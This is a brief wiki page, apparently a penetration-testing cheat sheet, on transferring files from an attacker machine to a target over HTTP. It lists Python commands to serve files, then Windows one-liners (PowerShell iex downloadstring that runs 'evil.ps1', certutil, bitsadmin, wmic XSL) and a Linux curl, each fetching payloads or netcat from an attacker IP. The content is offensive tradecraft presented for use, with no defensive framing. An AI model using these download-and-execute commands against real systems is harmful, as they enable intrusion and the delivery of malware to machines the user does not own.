---
title: "HTTP"
date: 2025-10-03
draft: false
type: wiki
---

From your local attacker machine, create a http server with:

```console
sudo python3 -m http.server 80
sudo python2 -m SimpleHTTPServer 80
```

It's also possible to specify which path to share, for example:

```console
sudo python3 -m http.server 80 --dir /home/kali/tools
```

-----------------------------

# Windows

```console
iex(new-object net.webclient).downloadstring("http://192.168.42.42/evil.ps1)
IWR -Uri "http://192.168.42.42/n64.exe" -Outfile "n64.exe"
certutil.exe -urlcache -split -f "http://192.168.42.42/nc.exe" nc.exe
wmic process get brief /format:"http://192.168.42.42/evilexcel.xsl
bitsadmin /Transfer myDownload http://192.168.42.42/evilfile.txt C:\Windows\Temp\evilfile.txt
```

-----------------------------

# Linux

```console
curl http://192.168.42.42/evil.php --output evil.php
```

-----------------------------
